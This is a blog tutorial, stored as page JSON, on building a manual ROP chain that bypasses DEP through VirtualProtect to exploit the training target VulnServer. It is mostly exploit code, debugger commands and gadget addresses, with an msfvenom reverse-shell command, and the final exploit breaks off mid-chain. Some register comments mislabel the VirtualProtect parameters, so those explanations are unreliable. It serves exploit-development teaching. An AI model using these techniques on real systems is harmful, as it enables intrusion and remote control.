{"pageProps":{"postData":{"slug":"virtualprotect_dep_bypass_guide","contentHtml":"\n<p><img src=\"/images/dep-bypass.jpeg\" alt=\"ROP chain exploitation techniques\"></p>\n<h2>Introduction</h2>\n<p>Data Execution Prevention (DEP) has been a game-changer in exploit development. The days of simply overflowing a buffer, jumping to your shellcode, and calling it a day are long gone. DEP enforces a simple rule: memory can be writable OR executable, but not both at the same time.</p>\n<p>So what happens when you try to execute shellcode in a classic buffer overflow? DEP detects code execution from a writable memory area and shuts everything down. Game over.</p>\n<p>But DEP isn't the impenetrable wall it appears to be. Through the magic of Return-Oriented Programming (ROP), we can leverage existing executable code to call Windows APIs that change memory protections, effectively bypassing DEP.</p>\n<p>In this guide, I'll walk you through manually creating a ROP chain to exploit VulnServer's TRUN command vulnerability with DEP enabled. Unlike many tutorials that rely on automated tools, we'll build our exploit piece by piece, understanding each step along the way.</p>\n<h2>Prerequisites</h2>\n<ul>\n<li>Windows 7/10 (32-bit) with WinDbg or Immunity Debugger with Mona.py. (This guide focuses on the 32-bit architecture).</li>\n<li>VulnServer running on a Windows VM (ensure it's the 32-bit version).</li>\n<li>Python 3 for exploit development</li>\n<li>Basic understanding of vanilla buffer overflows</li>\n</ul>\n<h2>1. Understanding the Vulnerability</h2>\n<p>Let's start by confirming that DEP is indeed preventing our standard exploit. A typical buffer overflow exploit for VulnServer would look like this:</p>\n<pre class=\"language-python\"><code class=\"language-python\">import struct\nimport socket\n\ntarget = (\"192.168.0.111\", 9999)  # VulnServer\n\nVULNSRVR_CMD = b\"TRUN /.:/\"\nOFFSET = 2003  # Bytes until we reach EIP\nJMP_ESP = 0x625011AF  # Address of a JMP ESP instruction\n\n# Shellcode - msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f python -b '\\x00'\nshellcode = b\"SHELLCODE\"\n\npayload = VULNSRVR_CMD\npayload += b\"A\" * OFFSET\npayload += struct.pack(\"&#x3C;I\", JMP_ESP)\npayload += b\"\\x90\" * 16  # NOP sled\npayload += shellcode\n\nwith socket.create_connection(target) as sock:\n    sock.recv(512)  # Welcome message\n    sock.send(payload)\n    print(\"[+] Exploit sent\")\n</code></pre>\n<p>When we run this with DEP enabled, our exploit fails with an access violation. Checking memory protection in the debugger confirms the issue:</p>\n<pre class=\"language-none\"><code class=\"language-none\">!vprot esp\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">BaseAddress:       00b4f000\nAllocationBase:    00950000\nAllocationProtect: 00000004  PAGE_READWRITE\nRegionSize:        00001000\nState:             00001000  MEM_COMMIT\nProtect:           00000004  PAGE_READWRITE\nType:              00020000  MEM_PRIVATE\n</code></pre>\n<p>The stack is marked as PAGE_READWRITE (not executable), confirming DEP is active and blocking our shellcode execution.</p>\n<h2>2. Finding the Buffer Overflow Offset</h2>\n<p>First things first - we need to find exactly where our input overwrites EIP:</p>\n<ol>\n<li>Generate a cyclic pattern:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona pc 3000\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">\nCreating cyclic pattern of 3000 bytes\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7...\n</code></pre>\n<ol start=\"2\">\n<li>Create a script to send this pattern:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">pattern = b\"Aa0Aa1Aa2Aa3Aa4Aa5...\" # Copy from mona output\npayload = b\"TRUN /.:/\" + pattern\n</code></pre>\n<ol start=\"3\">\n<li>After sending the pattern and crashing the server, find our exact offset:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona findmsp -distance 3000\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">[+] Examining registers\n EIP contains normal pattern : 0x396f4338 (offset 2003)\n ESP (0x00ecf9c8) points at offset 2010 in normal pattern (length 984)\n EBP contains normal pattern : 0x6f43376f (offset 2001)\n</code></pre>\n<p>We now know our offset to EIP is 2003 bytes.</p>\n<h2>3. Manual Gadget Hunting</h2>\n<p>This is where the real work begins. To build our ROP chain, we need to find small code snippets (\"gadgets\") in memory that end with a RET instruction. These will be the building blocks of our DEP bypass.</p>\n<h3>3.1 Finding Base ROP Gadgets</h3>\n<ol>\n<li>First, lets identify non-ASLR modules:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona modules\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False | False |  False   | False  | -1.0- [essfunc.dll] (C:\\VulnApps\\essfunc.dll) 0x0\n0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False | False |  False   | False  | -1.0- [vulnserver.exe] (C:\\VulnApps\\vulnserver.exe) 0x0\n</code></pre>\n<p>We'll use essfunc.dll because it's typically compiled without ASLR (Address Space Layout Randomization) and Rebase support in standard VulnServer setups (indicated by 'False' in the ASLR/Rebase columns). This simplifies our focus on the DEP bypass itself. Bypassing ASLR would require additional techniques, such as information leaks to find module base addresses dynamically, which are beyond the scope of this specific guide.</p>\n<ol start=\"2\">\n<li>Find a simple RET instruction (ROP NOP):</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"ret\" -m essfunc -cpb \"\\x00\"\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">0x62501022 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]\n0x62501057 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]\n0x625010b6 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]\n0x625011ab : ret | {PAGE_EXECUTE_READ} [essfunc.dll]\n</code></pre>\n<p>We'll use 0x62501022 as our ROP NOP.</p>\n<ol start=\"3\">\n<li>Find a JMP ESP gadget:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona jmp -r esp -m essfunc -cpb \"\\x00\"\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">0x625011AF : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]\n0x625011C7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]\n</code></pre>\n<p>We'll use 0x625011AF for our JMP ESP gadget later if needed, but the primary one for the final VirtualProtect return will be identified separately (we used 0x625011c7 in the final chain). (Self-correction: Clarified the JMP ESP usage slightly).</p>\n<h3>3.2 Finding System DLL Gadgets</h3>\n<p>We also need gadgets from system DLLs to complete our chain:</p>\n<ol>\n<li>Find PUSHAD instruction:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"pushad # ret\" -m \"msvcrt,ntdll,kernel32\" -cpb \"\\x00\"\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">0x775d6f67 : pushad | ret [msvcrt.dll]\n</code></pre>\n<ol start=\"2\">\n<li>Find gadgets for setting other registers:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"xchg eax, edx # ret\" -m \"ntdll\" -cpb \"\\x00\"\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">0x77d9e6c0 : xchg eax, edx | ret | {PAGE_EXECUTE_READ} [ntdll.dll]\n</code></pre>\n<ol start=\"3\">\n<li>Find gadgets for setting \"neg eax, ret\" registers:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"neg eax # ret\" -m \"kernel32\" -cpb \"\\x00\"\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">0x76505808 : neg eax | ret | {PAGE_EXECUTE_READ} [KERNEL32.dll]\n</code></pre>\n<h2>4. Finding VirtualProtect in IAT</h2>\n<p>To bypass DEP, we'll use Windows' VirtualProtect function to change memory permissions. First, we need to find its address in the Import Address Table (IAT):</p>\n<ol>\n<li>Examine the IAT and search for VirtualProtect:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">!dh essfunc -f\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\"> 5000 [     197] address [size] of Export Directory\n 6000 [     224] address [size] of Import Directory\n    0 [       0] address [size] of Resource Directory\n    0 [       0] address [size] of Exception Directory\n    0 [       0] address [size] of Security Directory\n 7000 [      E4] address [size] of Base Relocation Directory\n    0 [       0] address [size] of Debug Directory\n    0 [       0] address [size] of Description Directory\n    0 [       0] address [size] of Special Directory\n    0 [       0] address [size] of Thread Storage Directory\n    0 [       0] address [size] of Load Configuration Directory\n    0 [       0] address [size] of Bound Import Directory\n    0 [       0] address [size] of Import Address Table Directory\n    0 [       0] address [size] of Delay Import Directory\n    0 [       0] address [size] of COR20 Header Directory\n    0 [       0] address [size] of Reserved Directory\n</code></pre>\n<ol start=\"2\">\n<li>Dump the IAT and search for VirtualProtect:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">dps essfunc+0x6000 L100\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\"> 62506090  764cb3a0 KERNEL32!AddAtomA\n 62506094  764cb860 KERNEL32!FindAtomA\n 62506098  7650d160 KERNEL32!GetAtomNameA\n 6250609c  764d6570 KERNEL32!VirtualProtectStub\n 625060a0  764d7b60 KERNEL32!VirtualQueryStub\n</code></pre>\n<ol start=\"3\">\n<li>Verify this is the correct function:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">dd 0x6250609c L1\nu poi(0x6250609c)\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">764d6570 8bff            mov     edi,edi\n764d6572 55              push    ebp\n764d6573 8bec            mov     ebp,esp\n764d6575 5d              pop     ebp\n764d6576 ff253cb85376    jmp     dword ptr [KERNEL32!_imp__VirtualProtect (7653b83c)]\nKERNEL32!AppModelPolicy_GetPolicy_Internal:\n764d657c 8bff            mov     edi,edi\n764d657e 55              push    ebp\n764d657f 8bec            mov     ebp,esp\n</code></pre>\n<p>We've confirmed 0x6250609c is the IAT entry for VirtualProtect.</p>\n<h2>5. Finding a Writable Memory Region</h2>\n<p>For the VirtualProtect call, the lpflOldProtect parameter requires a pointer to a writable memory location. We need to find such a location that is reliable and doesn't contain bad characters in its address. We can inspect the memory layout of loaded modules, like KERNEL32.DLL, to find writable sections.</p>\n<ol>\n<li>First, find the base address of KERNEL32.DLL:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">lm vm kernel32\n</code></pre>\n<p>Output</p>\n<pre class=\"language-none\"><code class=\"language-none\">start    end        module name\n764c0000 765b0000   kernel32   (deferred)\n</code></pre>\n<p>So, the base address is 0x764c0000.</p>\n<ol start=\"2\">\n<li>Now, examine the PE header of KERNEL32.DLL to find its sections:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">!dh 0x764c0000\n</code></pre>\n<p>Scroll through the output looking for the \"SECTION HEADER\" information. You are looking for a section with \"Write\" permissions (often .data).</p>\n<pre class=\"language-none\"><code class=\"language-none\">[...]\nSECTION HEADER #6\n   .data name\n  5AF4 virtual size\n 7A000 virtual address (RVA)\n  5C00 size of raw data\n 78C00 file pointer to raw data\n     0 file pointer to relocation table\n     0 file pointer to line numbers\n     0 number of relocations\n     0 number of line numbers\n40000040 flags\n         Initialized Data\n         Read Write  &#x3C;-- Writable permissions!\n[...]\n</code></pre>\n<ol start=\"3\">\n<li>Identify a writable section. The .data section looks promising:</li>\n</ol>\n<ul>\n<li>It has Read Write permissions.</li>\n<li>Its Relative Virtual Address (RVA) is 0x7a000.</li>\n</ul>\n<ol start=\"4\">\n<li>Calculate the absolute start address of the .data section:</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">? &#x3C;base_address> + &#x3C;RVA>\n? 0x764c0000 + 0x7a000\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">Evaluate expression: 1985187840 = 7653a000\n</code></pre>\n<ol start=\"5\">\n<li>\n<p>Choose an address within this writable section. We need an address suitable for lpflOldProtect. Let's use 0x7653a3c1, which is used later in the ROP chain. This address is calculated as 0x7653a000 + 0x3c1. Since 0x3c1 is less than the section size (0x5af4), this address lies within the writable .data section.</p>\n</li>\n<li>\n<p>Verify the chosen address 0x7653a3c1 has the expected permissions:</p>\n</li>\n</ol>\n<pre class=\"language-none\"><code class=\"language-none\">!vprot 0x7653a3c1\n</code></pre>\n<p>Output:</p>\n<pre class=\"language-none\"><code class=\"language-none\">BaseAddress:       7653a000\nAllocationBase:    764c0000\nAllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY\nRegionSize:        00006000  // Note: RegionSize might cover more than just .data\nState:             00001000  MEM_COMMIT\nProtect:           00000004  PAGE_READWRITE  &#x3C;-- Confirmed Writable\nType:              01000000  MEM_IMAGE\n</code></pre>\n<p>We have successfully identified 0x7653a3c1 within KERNEL32.DLL's .data section as a suitable writable address using PE header inspection. We will use this address for the lpflOldProtect parameter.</p>\n<h2>6. Building Register Setup for VirtualProtect</h2>\n<p>Now we'll build our ROP chain to call VirtualProtect. Here's the function prototype:</p>\n<pre class=\"language-none\"><code class=\"language-none\">BOOL VirtualProtect(\n  LPVOID lpAddress,      // [ESP+4]  (Memory address to modify)\n  SIZE_T dwSize,         // [ESP+8]  (Size of region)\n  DWORD flNewProtect,    // [ESP+12] (Memory protection flag)\n  PDWORD lpflOldProtect  // [ESP+16] (Pointer to store old protection)\n);\n</code></pre>\n<p>When we use PUSHAD, the registers are pushed in this order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI.</p>\n<p>These values will map to VirtualProtect's parameters as follows:</p>\n<pre class=\"language-none\"><code class=\"language-none\">BOOL VirtualProtect(\n  LPVOID lpAddress,      // ECX -> [ESP+4]  (Address of shellcode)\n  SIZE_T dwSize,         // EDX -> [ESP+8]  (Size of region to make executable)\n  DWORD flNewProtect,    // EBX -> [ESP+C]  (PAGE_EXECUTE_READWRITE 0x40)\n  PDWORD lpflOldProtect  // ESP+8 -> [ESP+10] (Writable memory address)\n);\n</code></pre>\n<p>Let's build our ROP chain, setting up each register with the right value:</p>\n<h3>6.1 Setting up EBP (Stack Alignment)</h3>\n<pre class=\"language-python\"><code class=\"language-python\"># EBP - Used for stack pivot or alignment\nebp = struct.pack(\"&#x3C;I\", 0x775d8836)  # POP EBP # RETN [msvcrt.dll]\nebp += struct.pack(\"&#x3C;I\", 0x775d8836)  # skip 4 bytes [msvcrt.dll]\n</code></pre>\n<p><strong>Current Value</strong>: 0x775d8836 (same as gadget address)\n<strong>Reason</strong>: This serves as a placeholder and helps with stack alignment. Using the same address helps maintain predictable stack behavior.</p>\n<p><strong>How we found it</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"pop ebp # ret\" -m \"msvcrt\" -cpb \"\\x00\"\n</code></pre>\n<p><strong>Alternative Options</strong>:</p>\n<ol>\n<li><strong>Use JMP ESP directly</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">ebp = struct.pack(\"&#x3C;I\", 0x775d8836)  # pop ebp; ret\nebp += struct.pack(\"&#x3C;I\", 0x625011af)  # jmp esp\n</code></pre>\n<ol start=\"2\">\n<li><strong>Other module address</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">ebp = struct.pack(\"&#x3C;I\", 0x76fa54a3)  # pop ebp; ret [KERNEL32.dll]\nebp += struct.pack(\"&#x3C;I\", 0x76fa54a3)  # same address\n</code></pre>\n<h3>6.2 Setting up EBX (flNewProtect parameter)</h3>\n<pre class=\"language-python\"><code class=\"language-python\"># EBX - Size parameter (0x201)\nebx = struct.pack(\"&#x3C;I\", 0x75f366b4)  # POP EAX # RETN [KERNELBASE.dll]\nebx += struct.pack(\"&#x3C;I\", 0xfffffdff)  # Value to negate, will become 0x00000201\nebx += struct.pack(\"&#x3C;I\", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL]\nebx += struct.pack(\"&#x3C;I\", 0x77597926)  # XCHG EAX,EBX # RETN [msvcrt.dll]\n</code></pre>\n<p><strong>Current Value</strong>: 0x201 (Size of region to protect)\n<strong>Reason</strong>: This needs to be large enough to cover our shellcode (513 bytes).</p>\n<p><strong>How we calculated it</strong>: Using negation technique to avoid null bytes:</p>\n<ol>\n<li>Load EAX with 0xfffffdff (value to negate, will become 0x00000201)</li>\n<li>Negate EAX to get 0x201</li>\n<li>Exchange EAX and EBX</li>\n</ol>\n<p><strong>How we found these gadgets</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"pop eax\" -m \"kernelbase\" -cpb \"\\x00\"\n!py mona find -type instr -s \"neg eax\" -m \"kernel32\" -cpb \"\\x00\"\n!py mona find -type instr -s \"xchg eax, ebx\" -m \"msvcrt\" -cpb \"\\x00\"\n</code></pre>\n<p><strong>Alternative Options</strong>:</p>\n<ol>\n<li><strong>Adding from zero</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">ebx = struct.pack(\"&#x3C;I\", 0x77cef70e)  # xor eax, eax; ret\nebx += struct.pack(\"&#x3C;I\", 0x775b3084)  # add eax, 0x100; ret\nebx += struct.pack(\"&#x3C;I\", 0x775b3084)  # add eax, 0x100; ret\nebx += struct.pack(\"&#x3C;I\", 0x775b616f)  # add eax, 8; ret\nebx += struct.pack(\"&#x3C;I\", 0x77597926)  # xchg eax, ebx; ret\n</code></pre>\n<ol start=\"2\">\n<li><strong>Different size value</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">ebx = struct.pack(\"&#x3C;I\", 0x75f366b4)  # pop eax; ret\nebx += struct.pack(\"&#x3C;I\", 0xfffffeff)  # -0x101 (smaller region)\nebx += struct.pack(\"&#x3C;I\", 0x76505808)  # neg eax; ret\nebx += struct.pack(\"&#x3C;I\", 0x77597926)  # xchg eax, ebx; ret\n</code></pre>\n<h3>6.3 Setting up EDX (dwSize parameter)</h3>\n<pre class=\"language-python\"><code class=\"language-python\"># EDX - Protection flag (0x40)\nedx = struct.pack(\"&#x3C;I\", 0x75d91838)  # POP EAX # RETN [KERNELBASE.dll]\nedx += struct.pack(\"&#x3C;I\", 0xffffffc0)  # Value to negate, will become 0x00000040\nedx += struct.pack(\"&#x3C;I\", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL]\nedx += struct.pack(\"&#x3C;I\", 0x77d9e6c0)  # XCHG EAX,EDX # RETN [ntdll.dll]\n</code></pre>\n<p><strong>Current Value</strong>: 0x40 (PAGE_EXECUTE_READWRITE)\n<strong>Reason</strong>: This is the memory protection flag to make our shellcode executable.</p>\n<p><strong>How we calculated it</strong>: Using negation to avoid null bytes:</p>\n<ol>\n<li>Load EAX with 0xffffffc0 (value to negate, will become 0x00000040)</li>\n<li>Negate EAX to get 0x40</li>\n<li>Exchange EAX and EDX</li>\n</ol>\n<p><strong>How we found these gadgets</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"pop eax\" -m \"kernelbase\" -cpb \"\\x00\"\n!py mona find -type instr -s \"neg eax\" -m \"kernel32\" -cpb \"\\x00\"\n!py mona find -type instr -s \"xchg eax, edx\" -m \"ntdll\" -cpb \"\\x00\"\n</code></pre>\n<p><strong>Alternative Options</strong>:</p>\n<ol>\n<li><strong>Direct POP</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">edx = struct.pack(\"&#x3C;I\", 0x77e4b949)  # pop edx; ret\nedx += struct.pack(\"&#x3C;I\", 0x00000040)  # PAGE_EXECUTE_READWRITE\n</code></pre>\n<ol start=\"2\">\n<li><strong>Arithmetic with other constants</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">edx = struct.pack(\"&#x3C;I\", 0x77cef70e)  # xor eax, eax; ret\nedx += struct.pack(\"&#x3C;I\", 0x775a5f04)  # add eax, 0x20; ret\nedx += struct.pack(\"&#x3C;I\", 0x775a5f04)  # add eax, 0x20; ret\nedx += struct.pack(\"&#x3C;I\", 0x77d9e6c0)  # xchg eax, edx; ret\n</code></pre>\n<h3>6.4 Setting up ECX (lpAddress parameter)</h3>\n<pre class=\"language-python\"><code class=\"language-python\">ecx = struct.pack(\"&#x3C;I\", 0x775f94ee)  # POP ECX # RETN [msvcrt.dll]\necx += struct.pack(\"&#x3C;I\", 0x7653a3c1)  # &#x26;Writable location [KERNEL32.DLL]\n</code></pre>\n<p><strong>Current Value</strong>: 0x7653a3c1 (Writable memory address in KERNEL32.DLL)\n<strong>Reason</strong>: This register needs to hold the pointer to a writable memory location (lpflOldProtect parameter) where VirtualProtect can store the old memory protection flags.</p>\n<p><strong>How we found it</strong>: We identified a suitable writable address within KERNEL32.DLL's .data in Section 5.</p>\n<p><strong>How we found the gadget</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"pop ecx # ret\" -m \"msvcrt\" -cpb \"\\x00\"\n</code></pre>\n<p><strong>Alternative Options</strong>:</p>\n<ol>\n<li><strong>Using essfunc.dll's writable memory</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">ecx = struct.pack(\"&#x3C;I\", 0x775f94ee)  # pop ecx; ret\necx += struct.pack(\"&#x3C;I\", 0x62506228)  # Writable memory in essfunc.dll\n</code></pre>\n<ol start=\"2\">\n<li><strong>Stack Address</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\"># Use the current ESP value plus an offset\necx = struct.pack(\"&#x3C;I\", 0x77c3f1a4)  # mov ecx, esp; add ecx, 0x10; ret\n</code></pre>\n<p>Stack Address (More complex): Technique exist to calculate and use an address on the stack itself, but require careful offset management.</p>\n<h3>6.5 Setting up EDI (ROP NOP)</h3>\n<pre class=\"language-python\"><code class=\"language-python\"># EDI - Return address (ROP NOP)\nedi = struct.pack(\"&#x3C;I\", 0x76fe83f7)  # POP EDI # RETN [WS2_32.DLL]\nedi += struct.pack(\"&#x3C;I\", 0x7650580a)  # RETN (ROP NOP) [KERNEL32.DLL]\n</code></pre>\n<p><strong>Current Value</strong>: 0x7650580a (RET instruction)\n<strong>Reason</strong>: EDI isn't used directly in the VirtualProtect call, but it needs a valid address. A simple RET instruction works as a placeholder.</p>\n<p><strong>How we found it</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"pop edi\" -m \"ws2_32\" -cpb \"\\x00\"\n!py mona find -type instr -s \"ret\" -m kernel32 -cpb \"\\x00\"\n</code></pre>\n<p><strong>Alternative Options</strong>:</p>\n<ol>\n<li><strong>Any harmless gadget</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">edi = struct.pack(\"&#x3C;I\", 0x76fe83f7)  # pop edi; ret\nedi += struct.pack(\"&#x3C;I\", 0x90909090)  # NOP values\n</code></pre>\n<ol start=\"2\">\n<li><strong>Secondary return address</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">edi = struct.pack(\"&#x3C;I\", 0x76fe83f7)  # pop edi; ret\nedi += struct.pack(\"&#x3C;I\", 0x625011c7)  # Alternative JMP ESP\n</code></pre>\n<h3>6.6 Setting up ESI (JMP [EAX])</h3>\n<pre class=\"language-python\"><code class=\"language-python\"># ESI - Pointer to JMP [EAX] gadget\nesi = struct.pack(\"&#x3C;I\", 0x76525760)  # POP ESI # RETN [KERNEL32.DLL]\nesi += struct.pack(\"&#x3C;I\", 0x75e95833)  # JMP [EAX] [KERNELBASE.dll]\n</code></pre>\n<p><strong>Current Value</strong>: 0x75e95833 (JMP [EAX] instruction)\n<strong>Reason</strong>: This technique is crucial for our exploit. After PUSHAD, execution continues at the address in ESI. This gadget will jump to the address pointed to by EAX (which we'll set to VirtualProtect).</p>\n<p><strong>How we found it</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"pop esi\" -m \"kernel32\" -cpb \"\\x00\"\n!py mona find -type instr -s \"jmp dword ptr [eax]\" -m \"kernelbase\" -cpb \"\\x00\"\n</code></pre>\n<p><strong>Alternative Options</strong>:</p>\n<ol>\n<li><strong>CALL [EAX] instead of JMP</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">esi = struct.pack(\"&#x3C;I\", 0x76525760)  # pop esi; ret\nesi += struct.pack(\"&#x3C;I\", 0x75e9583b)  # call dword ptr [eax]; ret\n</code></pre>\n<ol start=\"2\">\n<li><strong>Direct IAT pointer technique</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">esi = struct.pack(\"&#x3C;I\", 0x76525760)  # pop esi; ret\nesi += struct.pack(\"&#x3C;I\", 0x6250609c)  # VirtualProtect IAT\n</code></pre>\n<h3>6.7 Setting up EAX (VirtualProtect pointer)</h3>\n<pre class=\"language-python\"><code class=\"language-python\"># EAX - Point to VirtualProtect\neax = struct.pack(\"&#x3C;I\", 0x75ee5082)  # POP EAX # RETN [KERNELBASE.dll]\neax += struct.pack(\"&#x3C;I\", 0x6250609c)  # ptr to &#x26;VirtualProtect() [IAT essfunc.dll]\n</code></pre>\n<p><strong>Current Value</strong>: 0x6250609c (VirtualProtect IAT entry)</p>\n<p><strong>Reason</strong>: When ESI (which contains JMP [EAX]) executes, it will jump to the address pointed to by EAX, which is VirtualProtect in the IAT.</p>\n<p><strong>How we found the gadget</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"pop eax\" -m \"kernelbase\" -cpb \"\\x00\"\n</code></pre>\n<p><strong>How we found the IAT entry</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">!dh essfunc -f\ndps essfunc+0x6000 L100\n</code></pre>\n<p><strong>Alternative Options</strong>:</p>\n<ol>\n<li><strong>MOV EAX technique</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">eax = struct.pack(\"&#x3C;I\", 0x75f10ada)  # mov eax, 0x6250609c; ret\n</code></pre>\n<ol start=\"2\">\n<li><strong>Arithmetic calculation</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">eax = struct.pack(\"&#x3C;I\", 0x77cef70e)  # xor eax, eax; ret\neax += struct.pack(\"&#x3C;I\", 0x75ee0982)  # add eax, 0x6250609c; ret\n</code></pre>\n<h3>6.8 Using PUSHAD to call VirtualProtect</h3>\n<pre class=\"language-python\"><code class=\"language-python\"># PUSHAD to call VirtualProtect\npushad = struct.pack(\"&#x3C;I\", 0x775d6f67)  # PUSHAD # RETN [msvcrt.dll]\n</code></pre>\n<p><strong>Current Value</strong>: 0x775d6f67 (PUSHAD; RET instruction)\n<strong>Reason</strong>: PUSHAD pushes all 8 general-purpose registers onto the stack in a specific order, setting up the parameter stack for VirtualProtect.</p>\n<p><strong>How we found it</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona find -type instr -s \"pushad # ret\" -m \"msvcrt\" -cpb \"\\x00\"\n</code></pre>\n<p><strong>Alternative Options</strong>:</p>\n<ol>\n<li><strong>PUSHAD from another module</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">pushad = struct.pack(\"&#x3C;I\", 0x76081981)  # pushad; ret [KERNEL32.dll]\n</code></pre>\n<ol start=\"2\">\n<li><strong>Manual parameter pushing (more complex)</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\"># Instead of PUSHAD, manually push each parameter\n# Note: This approach is much longer and more complex\nmanual_push = struct.pack(\"&#x3C;I\", 0x77cdeedf)  # pop edi; ret\nmanual_push += struct.pack(\"&#x3C;I\", 0x6250609c)  # VirtualProtect IAT\nmanual_push += struct.pack(\"&#x3C;I\", 0x7654321a)  # push edi; ret\n# ... More pushes for each parameter\n</code></pre>\n<h3>6.9 JMP ESP Gadget</h3>\n<pre class=\"language-python\"><code class=\"language-python\"># JMP ESP gadget for shellcode execution\njmp_esp = struct.pack(\"&#x3C;I\", 0x625011c7)  # ptr to 'jmp esp' [essfunc.dll]\n</code></pre>\n<p><strong>Current Value</strong>: 0x625011c7 (JMP ESP instruction)\n<strong>Reason</strong>: This is where VirtualProtect will return after execution. It jumps to the shellcode on the stack.</p>\n<p><strong>How we found it</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">!py mona jmp -r esp -m essfunc -cpb \"\\x00\"\n</code></pre>\n<p><strong>Alternative Options</strong>:</p>\n<ol>\n<li><strong>CALL ESP</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">jmp_esp = struct.pack(\"&#x3C;I\", 0x62501205)  # call esp\n</code></pre>\n<ol start=\"2\">\n<li><strong>PUSH ESP / RET</strong>:</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\">jmp_esp = struct.pack(\"&#x3C;I\", 0x625013df)  # push esp; ret\n</code></pre>\n<h2>7. Complete Exploit Code</h2>\n<p>Let's put everything together:</p>\n<pre class=\"language-python\"><code class=\"language-python\">#!/usr/bin/python\nimport struct\nimport socket\n\nTARGET_IP = \"192.168.0.112\"\nTARGET_PORT = 9999\ntarget = (TARGET_IP, TARGET_PORT)\n\nVULNSRVR_CMD = b\"TRUN /.:/\"\nTOTAL_BUFFER_LEN = 6000\nOFFSET = 2003\n\n# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f python -b '\\x00'\nbuf =  b\"\" # Shellcode generated by msfvenom - full bytes omitted for brevity\n...\n\n# Build the final ROP chain\nrop = b\"\"\n# EBP - Stack pivot setup (using POP EBP # RETN as placeholder/alignment)\nrop += struct.pack(\"&#x3C;I\", 0x775d8836)  # POP EBP # RETN [msvcrt.dll]\nrop += struct.pack(\"&#x3C;I\", 0x775d8836)  # Value for EBP (can be 